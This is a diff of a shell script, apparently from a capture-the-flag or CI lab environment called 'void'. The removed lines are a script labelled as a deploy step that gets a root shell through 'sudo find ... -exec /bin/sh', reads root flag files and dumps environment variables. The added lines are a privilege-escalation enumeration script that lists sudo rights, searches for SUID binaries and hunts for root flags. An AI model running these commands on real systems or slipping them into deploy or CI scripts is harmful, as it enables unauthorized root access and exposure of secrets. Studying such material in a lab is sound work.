@@ -1,28 +1,22 @@
-#!/usr/bin/env bash
-set -euo pipefail
+echo "========== SYSTEM ENUMERATION =========="
 
-echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
+printf "\n[+] Checking sudo permissions\n"
+sudo -l 2>/dev/null || true
 
-echo "=== CI FLAG ==="
-cat /opt/void/ci_flag.txt 2>/dev/null || echo "No ci_flag"
+printf "\n[+] Searching for SUID binaries\n"
+find / -type f -perm -u=s 2>/dev/null || true
 
-echo "=== SUDO CHECK ==="
-sudo -l
+printf "\n[+] Attempting root directory listing\n"
+sudo ls -lah /root 2>/dev/null || true
 
-echo "=== ROOT ACCESS VIA FIND ==="
-sudo find /root -exec /bin/sh \; -quit
+printf "\n[+] Looking for possible root flags\n"
+sudo find /root -iname "*flag*" 2>/dev/null || true
+sudo find / -iname "root.txt" 2>/dev/null || true
 
-echo "=== ROOT FLAG SEARCH ==="
-sudo find / -iname "*flag*" 2>/dev/null
+printf "\n[+] Dumping interesting VOID files\n"
+sudo find /opt -type f 2>/dev/null | grep -i void || true
 
-echo "=== TRY READING ROOT FILES ==="
-sudo cat /root/flag.txt 2>/dev/null || true
-sudo cat /root/root.txt 2>/dev/null || true
-sudo ls -la /root 2>/dev/null || true
+printf "\n[+] Current identity\n"
+id
 
-echo "=== VOID DIRECTORY ==="
-sudo ls -la /opt/void 2>/dev/null || true
-sudo find /opt/void -type f 2>/dev/null || true
-
-echo "=== ENV ==="
-env
+printf "\n========== ENUMERATION COMPLETE ==========\n"
